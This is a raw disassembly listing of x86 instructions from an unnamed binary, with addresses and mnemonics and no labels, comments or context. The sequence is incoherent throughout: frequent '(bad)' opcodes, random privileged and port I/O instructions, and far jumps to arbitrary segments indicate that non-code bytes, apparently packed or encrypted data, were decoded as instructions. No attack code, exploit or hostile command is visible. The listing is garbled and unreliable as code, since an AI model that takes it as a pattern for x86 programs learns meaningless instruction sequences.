  415193:	inc    ecx
  415194:	sahf   
  415195:	jp     0x4151d5
  415197:	jo     0x41516f
  415199:	jecxz  0x415194
  41519b:	pop    eax
  41519c:	sbb    BYTE PTR [edi],bh
  41519e:	je     0x415182
  4151a0:	xchg   edi,eax
  4151a1:	push   ds
  4151a2:	leave  
  4151a3:	test   BYTE PTR [esp+eiz*2-0xc93f9ab],dl
  4151aa:	(bad)  
  4151ab:	pop    esi
  4151ac:	mov    bl,0x9a
  4151ae:	or     DWORD PTR [ebp+ebx*2-0x2a],ecx
  4151b2:	inc    ecx
  4151b3:	fwait
  4151b4:	jb     0x415137
  4151b6:	vmulsd xmm4,xmm5,QWORD PTR [edx*1+0x5d1bd52e]
  4151bf:	mov    edi,0x9e14a709
  4151c4:	je     0x41514b
  4151c6:	aaa    
  4151c7:	stos   DWORD PTR es:[edi],eax
  4151c8:	xchg   ebp,eax
  4151c9:	or     dh,ah
  4151cb:	mov    eax,ds:0xe6a5adf5
  4151d0:	mov    esp,0x2068b25f
  4151d5:	sub    edi,edx
  4151d7:	pushf  
  4151d8:	rcl    DWORD PTR [edi-0x5e],cl
  4151db:	dec    esi
  4151dc:	mov    eax,0x12df19e8
  4151e1:	iret   
  4151e2:	loop   0x41518e
  4151e4:	aaa    
  4151e5:	xchg   esi,eax
  4151e6:	not    BYTE PTR [eax]
  4151e8:	xchg   esi,eax
  4151e9:	jecxz  0x415176
  4151eb:	jge    0x415240
  4151ed:	or     DWORD PTR [ecx-0x10a03ef2],esi
  4151f3:	outs   dx,DWORD PTR ds:[esi]
  4151f4:	cwde   
  4151f5:	push   ss
  4151f6:	adc    edi,ebx
  4151f8:	jmp    0x415197
  4151fa:	cld    
  4151fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4151fc:	jbe    0x41526a
  4151fe:	shr    DWORD PTR [eax-0x1b],0x5c
  415202:	(bad)  
  415203:	(bad)  
  415204:	iret   
  415205:	imul   esp,DWORD PTR [ebx],0x17
  415208:	pop    ds
  415209:	jp     0x41525e
  41520b:	in     eax,dx
  41520c:	into   
  41520d:	pop    eax
  41520e:	inc    edx
  41520f:	push   edx
  415210:	dec    edx
  415211:	imul   BYTE PTR [ebp-0x7c]
  415214:	push   es
  415215:	inc    ebp
  415216:	fstp   TBYTE PTR [edi-0x26]
  415219:	xor    BYTE PTR [ecx-0x407f60d0],dl
  41521f:	push   ss
  415220:	adc    esi,esp
  415222:	adc    eax,0xe51c1ac8
  415227:	pop    edx
  415228:	add    al,cl
  41522a:	push   0x3e
  41522c:	mov    fs,WORD PTR [esp+ebp*4-0x2]
  415230:	jbe    0x4151eb
  415232:	or     DWORD PTR [edi-0x56],edi
  415235:	leave  
  415236:	out    dx,al
  415237:	aaa    
  415238:	gs pop edx
  41523a:	jl     0x415235
  41523c:	jmp    ecx
  41523e:	stc    
  41523f:	push   ss
  415240:	cdq    
  415241:	and    eax,0x6be08848
  415246:	or     eax,0x46880366
  41524b:	leave  
  41524c:	div    al
  41524e:	fldcw  WORD PTR [edx]
  415250:	add    BYTE PTR [ebx+0x2f2511ae],bh
  415256:	mov    ebp,0xe907d5d3
  41525b:	cmp    bh,BYTE PTR [esi-0x4e]
  41525e:	inc    ebx
  41525f:	out    0x2a,al
  415261:	(bad)  
  415262:	mov    gs,WORD PTR [esi+edx*1+0x50d49eb0]
  415269:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41526a:	(bad)  
  41526b:	sbb    DWORD PTR ds:[esi+0x42110c67],esi
  415272:	add    edx,DWORD PTR [ecx]
  415274:	xchg   DWORD PTR [esi+0x18397ba0],esp
  41527a:	push   eax
  41527b:	ds fs jge 0x4152ce
  41527f:	jno    0x415249
  415281:	xchg   DWORD PTR [edi],edx
  415283:	and    dh,ah
  415285:	sti    
  415286:	mov    ebp,0xe47346fd
  41528b:	popa   
  41528c:	xchg   edx,eax
  41528d:	out    dx,al
  41528e:	inc    esp
  41528f:	mov    cl,0x5f
  415291:	sub    eax,0x3c071a68
  415296:	sbb    DWORD PTR [edi-0x4c648bd8],ebp
  41529c:	mov    ebp,0x9d7411d7
  4152a1:	mov    edi,0xec9e8026
  4152a6:	mov    esp,0x7ac13e93
  4152ab:	les    edi,FWORD PTR [ecx]
  4152ad:	mov    ebp,0xfc4762d4
  4152b2:	xchg   DWORD PTR [edx+ecx*4-0x43],ecx
  4152b6:	xchg   edi,eax
  4152b7:	cli    
  4152b8:	adc    BYTE PTR [ecx],al
  4152ba:	sub    ebp,esi
  4152bc:	cli    
  4152bd:	ret    
  4152be:	push   es
  4152bf:	adc    al,0x35
  4152c1:	into   
  4152c2:	dec    esi
  4152c3:	ds retf 
  4152c5:	jno    0x415261
  4152c7:	sbb    al,0x33
  4152c9:	js     0x4152e9
  4152cb:	sub    DWORD PTR [eax-0x7976e0cc],0xf3c03bcb
  4152d5:	mov    eax,0xea14ee2c
  4152da:	inc    edi
  4152db:	and    al,BYTE PTR [edx+eiz*1]
  4152de:	ror    DWORD PTR [ebx+0x20e7cee2],0x7d
  4152e5:	push   ebp
  4152e6:	or     DWORD PTR [edi-0x393bb80b],esp
  4152ec:	ror    DWORD PTR [esi+0x4f],1
  4152ef:	test   al,0xca
  4152f1:	and    ah,dh
  4152f3:	xrelease lock sbb DWORD PTR [ebx],edi
  4152f7:	and    al,0xe7
  4152f9:	sahf   
  4152fa:	mov    al,ds:0xf331ca6d
  4152ff:	sbb    DWORD PTR [ecx-0x1b],ebx
  415302:	(bad)  
  415303:	inc    esp
  415304:	add    BYTE PTR [ebp-0x15f57e92],ch
  41530a:	cmp    edx,edi
  41530c:	xchg   BYTE PTR [eax],dl
  41530e:	dec    esi
  41530f:	pop    eax
  415310:	(bad)  
  415311:	push   esi
  415312:	jnp    0x415328
  415314:	adc    esi,DWORD PTR [ecx+eax*8-0x7f1ab2af]
  41531b:	inc    esi
  41531c:	(bad)  
  41531e:	cmp    DWORD PTR [ebx+0x54],esp
  415321:	ret    
  415322:	ss ja  0x415365
  415325:	mov    ecx,0xffedaa09
  41532a:	adc    ecx,ebx
  41532c:	fdiv   DWORD PTR [edx-0x21]
  41532f:	pusha  
  415330:	and    DWORD PTR [edi-0x12764544],ebp
  415336:	je     0x41532d
  415338:	int3   
  415339:	push   eax
  41533a:	add    al,0xdc
  41533c:	xchg   esi,eax
  41533d:	gs mov eax,0x72b44719
  415343:	test   al,0xb7
  415345:	mov    eax,ss
  415347:	push   ecx
  415348:	fsub   st(4),st
  41534a:	test   BYTE PTR [edx+0x7fc8eb11],bh
  415350:	cmp    esp,DWORD PTR [esi]
  415352:	fisttp QWORD PTR [edi+0x15]
  415355:	dec    ah
  415357:	push   ds
  415358:	inc    eax
  415359:	out    dx,eax
  41535a:	push   ds
  41535b:	nop
  41535c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41535d:	ret    0x7b6c
  415360:	adc    BYTE PTR [esp+ebx*1-0x5640a71c],ch
  415367:	sti    
  415368:	cmp    eax,0xd18cda2b
  41536d:	xlat   BYTE PTR ds:[ebx]
  41536e:	push   ebx
  41536f:	rcr    BYTE PTR [edx+0xbfc6277],1
  415375:	add    BYTE PTR [esi+0x67],bh
  415378:	mov    ds:0xee60a0df,al
  41537d:	(bad)  
  41537f:	and    eax,0xcfdf3fee
  415384:	add    DWORD PTR [ecx+0x58],edi
  415387:	sar    DWORD PTR [esp+eax*1],0x58
  41538b:	mov    edx,esp
  41538d:	adc    DWORD PTR [edx-0x78477e0],ebp
  415393:	add    eax,0x1c52d6fb
  415398:	in     eax,0xbb
  41539a:	(bad)  
  41539b:	out    dx,al
  41539c:	xchg   BYTE PTR [ebp+0xc],ch
  41539f:	add    eax,0x6f18fb7b
  4153a4:	or     edi,0xfffffff0
  4153a7:	in     eax,0xea
  4153a9:	(bad)  
  4153aa:	xor    DWORD PTR ds:0x142852ad,edx
  4153b0:	xchg   edx,eax
  4153b1:	test   al,0xfb
  4153b3:	mov    eax,0x619c5c43
  4153b8:	push   ebx
  4153b9:	ins    DWORD PTR es:[edi],dx
  4153ba:	icebp  
  4153bb:	std    
  4153bc:	js     0x4153d9
  4153be:	arpl   ax,si
  4153c0:	add    DWORD PTR ds:0xe54e106,ebp
  4153c6:	dec    ebp
  4153c7:	adc    bh,BYTE PTR ds:0xeb75c9d0
  4153cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4153ce:	pushaw 
  4153d0:	cs jb  0x4153fa
  4153d3:	retf   0x1479
  4153d6:	adc    eax,0x24247439
  4153db:	mov    ebx,0x85ad5136
  4153e0:	mov    ebp,0xe6e1a45e
  4153e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4153e6:	mov    dh,BYTE PTR [edi-0x11]
  4153e9:	aas    
  4153ea:	int    0x27
  4153ec:	mov    es,WORD PTR [esi]
  4153ee:	inc    eax
  4153ef:	push   esi
  4153f0:	fcomp  QWORD PTR [edx+0x28]
  4153f3:	scas   eax,DWORD PTR es:[edi]
  4153f4:	jmp    0x1d08:0x25230eef
  4153fb:	jno    0x4153b4
  4153fd:	mov    eax,0x8ac7da15
  415402:	loope  0x41539a
  415404:	add    eax,0x310e6f6e
  415409:	dec    eax
  41540a:	xor    DWORD PTR [ecx+0x7d],edi
  41540d:	xchg   ecx,eax
  41540e:	cmp    DWORD PTR [ecx],ebp
  415410:	sar    BYTE PTR [ebp+0x7e],cl
  415413:	(bad)  
  415414:	in     eax,0xa1
  415416:	pop    edi
  415417:	ins    BYTE PTR es:[edi],dx
  415418:	je     0x415479
  41541a:	sub    ebp,DWORD PTR [ebx]
  41541c:	sbb    eax,0x11c542e2
  415421:	hlt    
  415422:	add    dl,dl
  415424:	test   edx,ecx
  415426:	xor    eax,0xa5dd752
  41542b:	mov    cl,0x58
  41542d:	iret   
  41542e:	fdiv   st(2),st
  415430:	push   ebx
  415431:	ret    
  415432:	xor    BYTE PTR [eax-0x7c],bh
  415435:	jg     0x415418
  415437:	mov    WORD PTR [esi+eax*4+0x69],fs
  41543b:	adc    eax,0x8a500469
  415440:	sub    esi,edx
  415442:	pop    esp
  415443:	pop    esp
  415444:	out    0x4b,al
  415446:	rol    bh,0x4e
  415449:	jmp    0xe247d10a
  41544e:	jae    0x41544a
  415450:	test   BYTE PTR [esi-0x23],0xb4
  415454:	pop    ebp
  415455:	jmp    0x9a55:0x69bccbad
  41545c:	nop
  41545d:	xor    BYTE PTR [ebp+0x4d],dh
  415460:	cli    
  415461:	fstp   DWORD PTR [ebp+ecx*4+0xf528014]
  415468:	lock sub edx,DWORD PTR [ebx]
  41546b:	repz or eax,0x966df0af
  415471:	sbb    bl,BYTE PTR [ebp+0x2ca1229d]
  415477:	dec    esi
  415478:	sbb    esp,DWORD PTR [edi]
  41547a:	(bad)  
  41547c:	mov    cl,bh
  41547e:	mov    eax,ds:0x537850f5
  415483:	adc    eax,0x8ac222ea
  415488:	sar    DWORD PTR [edi-0x77],cl
  41548b:	ret    0x3b02
  41548e:	pop    edi
  41548f:	mov    edx,gs
  415491:	or     BYTE PTR [esi-0x15],dl
  415494:	mov    edx,0xdd8ba6cf
  415499:	cmp    esi,DWORD PTR [esi+0x8612a2d]
  41549f:	mov    ebx,0x570dc176
  4154a4:	out    0x57,al
  4154a6:	clc    
  4154a7:	mov    al,ds:0xbb9cffcd
  4154ac:	xor    ah,dh
  4154ae:	adc    dh,ch
  4154b0:	cwde   
  4154b1:	out    0x8,eax
  4154b3:	cmp    BYTE PTR [esi],0x42
  4154b6:	in     eax,dx
  4154b7:	scas   al,BYTE PTR es:[edi]
  4154b8:	inc    DWORD PTR [ecx-0x174924c9]
  4154be:	inc    edx
  4154bf:	fnsave [edx+0x7e22303e]
  4154c5:	int3   
  4154c6:	sar    dl,cl
  4154c8:	shl    DWORD PTR [edx-0x1a08326c],1
  4154ce:	sar    eax,1
  4154d0:	or     DWORD PTR [esi],ebx
  4154d2:	lods   al,BYTE PTR ds:[esi]
  4154d3:	imul   BYTE PTR [eax+0xf]
  4154d6:	in     eax,dx
  4154d7:	add    al,BYTE PTR [edx+0x64809e10]
  4154dd:	jecxz  0x415518
  4154df:	ds popa 
  4154e1:	aam    0xae
  4154e3:	xchg   esi,eax
  4154e4:	fiadd  WORD PTR [esi+0x56b293a3]
  4154ea:	sbb    BYTE PTR cs:[edi-0x305b9e5],0x8a
  4154f2:	lods   eax,DWORD PTR ds:[esi]
  4154f3:	sub    al,0x9f
  4154f5:	stos   DWORD PTR es:[edi],eax
  4154f6:	push   ebx
  4154f7:	cs aad 0x1f
  4154fa:	icebp  
  4154fb:	cs pushf 
  4154fd:	and    al,dh
  4154ff:	call   0xbe0f:0xb615b59b
  415506:	mov    esi,0x1678120c
  41550b:	ret    
  41550c:	adc    DWORD PTR [eax-0x64],esi
  41550f:	lods   eax,DWORD PTR ds:[esi]
  415510:	cli    
  415511:	pop    esp
  415512:	jb     0x415557
  415514:	outs   dx,DWORD PTR ds:[esi]
  415515:	ds pop ds
  415517:	scas   eax,DWORD PTR es:[edi]
  415518:	inc    ebx
  415519:	(bad)  
  41551a:	cmp    BYTE PTR [esi+0x74],bh
  41551d:	hlt    
  41551e:	nop
  41551f:	jmp    0x41559b
  415521:	cmc    
  415522:	pop    ebx
  415523:	pop    edx
  415524:	lock add edx,DWORD PTR [eax-0x5417e878]
  41552b:	sar    BYTE PTR ds:0x2c8287c9,0x9d
  415532:	jg     0x6391160d
  415538:	dec    ecx
  415539:	call   0x74d3:0x3a10b290
  415540:	mov    ebx,0x2e68f67
  415545:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415546:	push   0xd2d6a022
  41554b:	cmp    DWORD PTR [eax-0x28],esi
  41554e:	int    0xd7
  415550:	xlat   BYTE PTR ds:[ebx]
  415551:	inc    eax
  415552:	cmp    ch,BYTE PTR [eax+0x62]
  415555:	test   DWORD PTR [eax+0x57],0x34d7961
  41555c:	mov    esi,DWORD PTR [ebx+eax*4+0xf]
  415560:	sbb    DWORD PTR [ebx],edi
  415562:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415563:	stos   BYTE PTR es:[edi],al
  415564:	mov    gs,ebp
  415566:	xor    DWORD PTR [edi-0x78],edx
  415569:	sbb    DWORD PTR [ebp-0x39660e76],eax
  41556f:	add    eax,0x5f0a2a7a
  415574:	push   edi
  415575:	bound  esi,QWORD PTR [eax+0x7363c07]
  41557b:	leave  
  41557c:	cli    
  41557d:	fs (bad) 
  415580:	inc    esp
  415581:	in     al,dx
  415582:	sub    DWORD PTR [eax+0xe],esi
  415585:	jb     0x415582
  415587:	repz push ebx
  415589:	adc    eax,DWORD PTR [edi+0x56]
  41558c:	or     eax,0x4f686b7e
  415591:	stc    
  415592:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415593:	add    al,0x41
  415595:	dec    edx
  415596:	sub    al,0xee
  415598:	sub    BYTE PTR [edx+0x410c07f3],dh
  41559e:	sbb    cl,cl
  4155a0:	mov    dl,0x20
  4155a2:	popa   
  4155a3:	add    bh,BYTE PTR [edi+edi*1-0x458b5c11]
  4155aa:	pusha  
  4155ab:	push   ss
  4155ac:	rol    eax,0xb7
  4155af:	test   BYTE PTR [edi-0x5773e35d],al
  4155b5:	mov    al,0x9
  4155b7:	mov    bh,al
  4155b9:	add    ebp,DWORD PTR [ebp+0x59125667]
  4155bf:	out    0x86,al
  4155c1:	dec    edi
  4155c2:	inc    ebp
  4155c3:	pop    ebx
  4155c4:	push   edx
  4155c5:	jo     0x4155b0
  4155c7:	add    ch,bh
  4155c9:	push   ss
  4155ca:	xchg   edx,eax
  4155cc:	xor    ecx,DWORD PTR [edi+edi*4-0x58]
  4155d0:	adc    DWORD PTR [edi-0x6069799d],ebp
  4155d6:	jo     0x4155c5
  4155d8:	mov    al,0x23
  4155da:	les    esi,FWORD PTR [edi]
  4155dc:	and    cl,dh
  4155de:	cmc    
  4155df:	push   edi
  4155e0:	fwait
  4155e1:	imul   edx,DWORD PTR [edx],0x200616d8
  4155e7:	xor    al,0x87
  4155e9:	cmc    
  4155ea:	test   DWORD PTR [edx+0x5182f323],edx
  4155f0:	sbb    edi,DWORD PTR [edx+edx*1-0xb62f3c2]
  4155f7:	aad    0x4b
  4155f9:	and    bh,BYTE PTR [edi+ecx*1-0x72]
  4155fd:	ins    BYTE PTR es:[edi],dx
  4155fe:	and    al,BYTE PTR [edi]
  415600:	nop
  415601:	xchg   esp,eax
  415602:	loope  0x41561b
  415604:	fistp  QWORD PTR [edi-0x6a]
  415607:	out    dx,eax
  415608:	or     esp,eax
  41560a:	push   es
  41560b:	fsub   st(1),st
  41560d:	rcr    DWORD PTR [esi],1
  41560f:	mov    ds:0x9cff331d,eax
  415614:	mov    bh,0xd2
  415616:	std    
  415617:	add    DWORD PTR [eax],esi
  415619:	pop    es
  41561a:	push   edi
  41561b:	xor    DWORD PTR [edx+0x63],ebp
  41561e:	nop
  41561f:	shl    BYTE PTR [ebp+0x6f],0xa3
  415623:	sbb    ch,dl
  415625:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415626:	in     eax,dx
  415627:	lock repnz out 0x3f,eax
  41562b:	test   eax,0x3fe2a85f
  415630:	and    eax,0x854b8e91
  415635:	or     ebx,DWORD PTR [esp+edi*2+0x28]
  415639:	in     al,dx
  41563a:	mov    eax,0x5448c2e4
  41563f:	add    dh,bh
  415641:	mov    dh,0x4c
  415643:	popf   
  415644:	mov    al,BYTE PTR es:[esi]
  415647:	(bad)  
  415648:	mov    bh,0x91
  41564a:	test   al,0x9e
  41564c:	fwait
  41564d:	adc    BYTE PTR [edi+0x156943d1],dl
  415653:	fwait
  415654:	std    
  415655:	mov    esi,0xd400eada
  41565a:	scas   al,BYTE PTR es:[edi]
  41565b:	std    
  41565c:	dec    eax
  41565d:	or     cl,bl
  41565f:	fstp   QWORD PTR [esi+0x50d7bfde]
  415665:	mov    al,ds:0x337d7e34
  41566a:	arpl   cx,cx
  41566c:	inc    ecx
  41566d:	mov    al,0x30
  41566f:	mov    bl,ah
  415671:	adc    ch,dh
  415673:	adc    eax,0xcd2f09ed
  415678:	or     edi,DWORD PTR [esi]
  41567a:	cmp    edi,DWORD PTR [edi+0x46]
  41567d:	xchg   edi,eax
  41567e:	stos   DWORD PTR es:[edi],eax
  41567f:	or     DWORD PTR [ebx-0x41],esp
  415682:	add    DWORD PTR [ebp-0x11781661],0x1e
  415689:	(bad)  
  41568a:	std    
  41568b:	lea    ecx,[ecx-0x6f1991b9]
  415691:	(bad)  
  415692:	jnp    0x4156d5
  415694:	dec    esi
  415695:	leave  
  415696:	dec    ebx
  415697:	dec    ebp
  415698:	ret    
  415699:	fs dec ecx
  41569b:	jg     0x4156da
  41569d:	mov    esi,0xcc500a5b
  4156a2:	fwait
  4156a3:	and    ch,BYTE PTR [edi]
  4156a5:	push   edx
  4156a6:	rol    BYTE PTR [ebp+ecx*8-0x65161973],cl
  4156ad:	mov    dh,0xee
  4156af:	pop    edi
  4156b0:	js     0x41563a
  4156b2:	add    ebp,DWORD PTR [edx+ebx*8+0x27]
  4156b6:	fisub  WORD PTR [edi-0xc]
  4156b9:	out    0x91,eax
  4156bb:	dec    esi
  4156bc:	addr16 mov al,ds:0x1432
  4156c0:	xor    ecx,DWORD PTR [edi-0x30643f41]
  4156c6:	cli    
  4156c7:	std    
  4156c8:	mov    ds,WORD PTR [esi-0x40]
  4156cb:	mov    ds:0x1f088461,al
  4156d0:	and    eax,0x78671eb0
  4156d5:	stos   DWORD PTR es:[edi],eax
  4156d6:	and    ecx,DWORD PTR [esi-0x74]
  4156d9:	push   0x8
  4156db:	in     eax,0x88
  4156dd:	push   edi
  4156de:	jle    0x415687
  4156e0:	mov    dl,0xbf
  4156e2:	and    DWORD PTR [edx-0x7c1d2639],edx
  4156e8:	lods   al,BYTE PTR ds:[esi]
  4156e9:	or     BYTE PTR [ecx+ebp*2+0x1efac892],bh
  4156f0:	in     al,0x43
  4156f2:	adc    eax,0xb8c96e03
  4156f7:	push   ebx
  4156f8:	or     al,0xfc
  4156fa:	stos   BYTE PTR es:[edi],al
  4156fb:	jb     0x415719
  4156fd:	cdq    
  4156fe:	push   esp
  4156ff:	push   edx
  415700:	ret    
  415701:	mov    BYTE PTR [eax+0x69],al
  415704:	mov    esi,0x57b69e27
  415709:	mov    DWORD PTR [esi],esi
  41570b:	test   edi,0x6ffff729
  415711:	jle    0x4156af
  415713:	pop    ss
  415714:	out    dx,al
  415715:	je     0x415710
  415717:	das    
  415718:	shl    BYTE PTR [edx],cl
  41571a:	mov    ah,0xf7
  41571c:	gs sub edx,esp
  41571f:	cmp    eax,0xa708a187
  415724:	imul   eax,DWORD PTR [ebx-0x2f6ef11a],0xffffff95
  41572b:	fmul   DWORD PTR [edx+esi*8-0x1]
  41572f:	jae    0x415735
  415731:	(bad)  
  415732:	fnstsw WORD PTR [esi]
  415734:	pop    ecx
  415735:	or     eax,0x7695ec4a
  41573a:	and    eax,0x79e92702
  41573f:	call   0x64f74156
  415744:	xchg   ecx,eax
  415745:	jnp    0x41570a
  415747:	dec    edi
  415748:	mov    ds:0x21afd074,al
  41574d:	add    al,0xb2
  41574f:	sar    BYTE PTR [eax+eax*1],0xb7
  415753:	mov    ds:0x2d92df6d,al
  415758:	jmp    0xf7f52ea7
  41575d:	mov    esi,?
  41575f:	leave  
  415760:	adc    ah,BYTE PTR [eax-0x44]
  415763:	outs   dx,BYTE PTR ds:[esi]
  415764:	(bad)  
  415766:	xor    dh,BYTE PTR [esi]
  415768:	cs test eax,0xf694b22
  41576e:	sub    eax,0xfeeea6cd
  415773:	mov    DWORD PTR [ebx],ebp
  415775:	cmp    DWORD PTR [ecx-0x6e4829d3],eax
  41577b:	retf   0x1353
  41577e:	and    ecx,DWORD PTR [edx-0x13b01646]
  415784:	mov    ebp,0x81457e95
  415789:	mov    ebp,0x1da5ef4
  41578e:	pop    ss
  41578f:	cmp    ecx,DWORD PTR [esi]
  415791:	mov    edx,0x6288ae5b
  415796:	ins    BYTE PTR es:[edi],dx
  415797:	mov    al,ds:0x28bd7897
  41579c:	(bad)  
  41579d:	shl    BYTE PTR [edx+0x66dba984],cl
  4157a3:	jmp    DWORD PTR [esi-0x5f]
  4157a6:	mov    eax,ds:0x104762a9
  4157ab:	lock mov eax,0x2e657aff
  4157b1:	jmp    0x2fae:0x3d33e061
  4157b8:	adc    edx,eax
  4157ba:	or     al,0xc7
  4157bc:	call   0x872cbf93
  4157c1:	mov    al,ds:0x8ab92e52
  4157c6:	mov    DWORD PTR [edx-0x77],ebx
  4157c9:	mov    ds:0xe91951b,al
  4157ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4157cf:	dec    ecx
  4157d0:	daa    
  4157d1:	mov    cl,0xa6
  4157d3:	cmp    esi,DWORD PTR [edx]
  4157d5:	sti    
  4157d6:	hlt    
  4157d7:	jnp    0x4157b9
  4157d9:	aas    
  4157da:	pop    esp
  4157db:	or     BYTE PTR [edi-0x45af4591],al
  4157e1:	(bad)  
  4157e2:	dec    ecx
  4157e3:	das    
  4157e4:	mov    ecx,es
  4157e6:	test   al,0x3b
  4157e8:	push   eax
  4157e9:	cmp    eax,0xe8797156
  4157ee:	dec    ecx
  4157ef:	retf   0x5fbb
  4157f2:	xlat   BYTE PTR ds:[ebx]
  4157f3:	adc    eax,0x7944b0f2
  4157f8:	ret    
  4157f9:	cmc    
  4157fa:	lods   eax,DWORD PTR ds:[esi]
  4157fb:	fcmovnu st,st(0)
  4157fd:	xchg   ebx,eax
  4157fe:	ret    0x6a5d
  415801:	addr16 clc 
  415803:	mov    fs,ecx
  415805:	popf   
  415806:	sub    al,BYTE PTR [ecx-0x3c]
  415809:	imul   eax,DWORD PTR [ebx-0x74],0xffffffbd
  41580d:	mov    edx,0x27658ca4
  415812:	add    edi,DWORD PTR [edi]
  415814:	por    mm2,mm0
  415817:	(bad)  
  415818:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415819:	cmp    DWORD PTR [ecx+eiz*2-0x52ce2f4d],ebp
  415820:	pop    eax
  415821:	call   0x6664b03a
  415826:	dec    ebx
  415827:	lock mov esp,0x37e65a6
  41582d:	lods   eax,DWORD PTR ds:[esi]
  41582e:	pop    eax
  41582f:	shl    DWORD PTR [esi],cl
  415831:	xor    BYTE PTR [edx],0x3f
  415834:	sub    DWORD PTR [ecx],esi
  415836:	mov    ch,0xb7
  415838:	popa   
  415839:	dec    edx
  41583a:	xlat   BYTE PTR ds:[ebx]
  41583b:	xlat   BYTE PTR ds:[ebx]
  41583c:	(bad)  
  41583d:	clc    
  41583e:	cld    
  41583f:	call   0xeafe:0x4fed3c6d
  415846:	and    al,dh
  415848:	add    esi,edi
  41584a:	pop    edi
  41584b:	call   0x1953ca98
  415850:	push   ecx
  415851:	push   ss
  415852:	inc    eax
  415853:	fst    QWORD PTR [edx]
  415855:	sbb    eax,0x281af74
  41585a:	fmulp  st(3),st
  41585c:	std    
  41585d:	mul    BYTE PTR [esi+0x3e]
  415860:	mov    eax,0x3f571e9c
  415865:	fcom   DWORD PTR [edi-0x77594856]
  41586b:	sbb    eax,0xeaed9e87
  415870:	ja     0x415828
  415872:	loop   0x415806
  415874:	pop    es
  415875:	dec    ebp
  415876:	adc    al,0xac
  415878:	inc    eax
  415879:	rol    esp,cl
  41587b:	(bad)  
  41587c:	rcl    BYTE PTR [ebx+0x6e8ceff1],cl
  415882:	mov    ebx,DWORD PTR ds:0x40def9b4
  415888:	mov    cl,0x38
  41588a:	mov    ebx,edi
  41588c:	jns    0x4158e3
  41588e:	lods   al,BYTE PTR ds:[esi]
  41588f:	dec    esp
  415890:	mov    edx,0x80e61126
  415895:	int    0x47
  415897:	loope  0x415829
  415899:	inc    eax
  41589a:	adc    eax,0x58259be9
  41589f:	arpl   WORD PTR [esi+0x29],cx
  4158a2:	mov    edi,edx
  4158a4:	mov    al,0x97
  4158a6:	cli    
  4158a7:	stos   BYTE PTR es:[edi],al
  4158a8:	sub    al,0x70
  4158aa:	sbb    dh,0x90
  4158ad:	sub    eax,0xf86bc565
  4158b2:	xlat   BYTE PTR ds:[ebx]
  4158b3:	cmp    al,0x75
  4158b5:	push   ds
  4158b6:	pop    ebp
  4158b7:	dec    edi
  4158b8:	pop    esi
  4158b9:	dec    edx
  4158ba:	xor    DWORD PTR ds:0xee76495b,ecx
  4158c0:	push   ds
  4158c1:	push   0x75
  4158c3:	jmp    0x415892
  4158c5:	dec    edx
  4158c6:	pop    ebp
  4158c7:	rol    BYTE PTR [eax+0x1ec8750d],cl
  4158cd:	dec    esp
  4158ce:	jmp    0x64c3:0x2576e5e8
  4158d5:	jp     0x415942
  4158d7:	xor    ecx,0xfe0e1b49
  4158dd:	scas   eax,DWORD PTR es:[edi]
  4158de:	(bad)  
  4158df:	fsubr  QWORD PTR [edx]
  4158e1:	adc    ah,cl
  4158e3:	js     0x415876
  4158e5:	rol    BYTE PTR [edx-0x407227f6],cl
  4158eb:	xor    eax,0x998148ff
  4158f0:	fiadd  DWORD PTR [edi-0x35227d83]
  4158f6:	inc    eax
  4158f7:	mov    eax,ds:0x28273873
  4158fc:	clc    
  4158fd:	xchg   DWORD PTR [ecx],edi
  4158ff:	push   edx
  415900:	or     DWORD PTR [edx+edx*8+0x28da3806],0x38
  415908:	inc    edx
  415909:	out    0xa1,eax
  41590b:	cmp    ah,BYTE PTR [ebp+ecx*1-0x5f]
  41590f:	outs   dx,BYTE PTR ds:[esi]
  415910:	cmp    eax,0x1deb9d5f
  415915:	mov    ah,0xe6
  415917:	bound  edx,QWORD PTR [ebp-0x7f]
  41591a:	aas    
  41591b:	cs test eax,0x1cc8c598
  415921:	outs   dx,DWORD PTR ds:[esi]
  415922:	jge    0x415919
  415924:	pop    ecx
  415925:	mov    ah,0x99
  415927:	and    cl,0x68
  41592a:	xor    BYTE PTR [ebp+0x76b9bc8e],0x18
  415931:	jne    0x4158ed
  415933:	adc    bh,BYTE PTR [esi-0x4223cb4]
  415939:	dec    esi
  41593a:	dec    eax
  41593b:	call   0x452b:0x1bd6a163
  415942:	or     dh,BYTE PTR [ecx+eax*4]
  415945:	xchg   esi,eax
  415946:	outs   dx,BYTE PTR ds:[esi]
  415947:	mov    al,0x15
  415949:	(bad)  
  41594a:	pop    ebx
  41594b:	stos   DWORD PTR es:[edi],eax
  41594c:	iret   
  41594d:	sub    BYTE PTR [edi+0x69828ebc],0x3e
  415954:	pop    esi
  415955:	mov    ah,0x77
  415957:	add    al,0x1f
  415959:	xor    eax,0x925fdad4
  41595e:	imul   ecx
  415960:	fisub  DWORD PTR [ebp+0x4e778cbd]
  415966:	and    ch,BYTE PTR [ebp+0x34]
  415969:	aad    0xb6
  41596b:	and    DWORD PTR [eax],edi
  41596d:	sahf   
  41596e:	int    0x6e
  415970:	adc    BYTE PTR [edx],bl
  415972:	or     esi,DWORD PTR [ecx+0x49]
  415975:	dec    ebp
  415976:	jbe    0x415904
  415978:	mov    ebx,0xd7165700
  41597d:	mov    ch,0x1e
  41597f:	leave  
  415980:	pushf  
  415981:	jp     0x415918
  415983:	pop    edx
  415984:	std    
  415985:	gs (bad) 
  415987:	lahf   
  415988:	test   eax,0xc5a9dc33
  41598d:	out    dx,eax
  41598e:	sbb    DWORD PTR [ecx],0xffffffc6
  415991:	push   0x103b66e0
  415996:	clc    
  415997:	dec    ebx
  415998:	lods   eax,DWORD PTR ds:[esi]
  415999:	mov    BYTE PTR [ecx-0xefa4606],bh
  41599f:	std    
  4159a0:	cmp    al,BYTE PTR [edi+0x76cbf132]
  4159a6:	data16 cmp BYTE PTR [ebx+0x154f873e],dl
  4159ad:	repnz or eax,0x8e364035
  4159b3:	mov    bl,0xf4
